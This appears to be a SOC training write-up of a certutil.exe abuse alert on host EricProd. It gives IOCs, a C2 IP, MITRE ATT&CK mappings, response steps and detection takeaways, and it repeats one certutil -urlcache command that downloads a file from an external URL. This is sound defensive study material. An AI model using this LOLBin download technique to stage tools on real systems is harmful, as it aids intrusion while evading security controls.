# 🚨 SOC Alert – Suspicious Certutil Activity (EventID: 113)

---

## 📌 Alert Overview

- **Event ID:** 113  
- **Hostname:** EricProd  
- **Host IP:** 172.16.17.22  
- **Related Binary:** certutil.exe  
- **Binary Path:** C:\Windows\System32\certutil.exe  

---

## 🧠 Incident Summary

On March 01, 2022 at 11:06 AM, a true positive alert was generated after suspicious usage of the legitimate Windows binary `certutil.exe` was detected.

The attacker abused `certutil.exe` to download a file from an external source using the following command:

```
certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-win32.zip nmap.zip
```

Shortly after execution:

- The attacker gained access to the host system
- Persistence mechanisms were established
- Access to the host's Outlook data was observed
- C2 communication was detected

The host system was contained and the alert was escalated to Tier 2 for further incident handling.

---

# ⚠️ Indicators of Compromise (IOCs)

## 🖥️ Affected Host

```
Hostname: EricProd
IP Address: 172.16.17.22
```

---

## 🌐 C2 IP Address

```
185.199.109.133
```

- Identified as C2 communication IP
- External outbound connection observed

---

## 🧩 Abused Legitimate Binary (LOLBin)

```
C:\Windows\System32\certutil.exe
```

- Native Windows utility
- Commonly abused for file download and payload staging

---

## 🧾 Suspicious Command Execution

```
certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-win32.zip nmap.zip
```

### Command Breakdown:

- `-urlcache` → Downloads file from URL
- `-split` → Splits output into multiple files if needed
- `-f` → Forces overwrite

This technique is frequently used by attackers to download tools or payloads while bypassing security controls.

---

## 📦 Downloaded File

```
nmap-7.92-win32.zip
Saved as: nmap.zip
```

---

# 🔎 Observed Malicious Behavior

- LOLBin abuse via `certutil.exe`
- External file download from remote source
- Outbound C2 communication
- Host access established
- Persistence activity observed
- Outlook data access

---

# 🎯 MITRE ATT&CK Mapping

- T1218 – Signed Binary Proxy Execution
- T1105 – Ingress Tool Transfer
- T1071 – Application Layer Protocol (C2)
- T1005 – Data from Local System
- T1114 – Email Collection
- T1547 – Persistence

---

# 🛑 Response Actions

- Identified suspicious certutil execution
- Confirmed external download activity
- Detected C2 communication
- Contained affected host
- Added artifacts and documented findings
- Escalated to Tier 2 for deeper investigation

---

# 📖 Full Investigation Walkthrough

👉 [Hashnode Blog Here](https://rideshcyber.hashnode.dev/series/soc-alert-walkthroughs-letsdefend)

---

# 📌 Key Takeaways

- Legitimate Windows utilities like `certutil.exe` are frequently abused.
- File downloads using `-urlcache` should always be investigated.
- C2 communication strongly indicates active compromise.
- Monitoring command-line arguments is critical for detection.
- Early containment prevents lateral movement and data exfiltration.

---

## 🧑‍💻 About This File
This File documents real-world SOC investigations focusing on:

- LOLBin abuse detection
- Command-line analysis
- IOC extraction
- Threat hunting methodology
- Incident response workflow
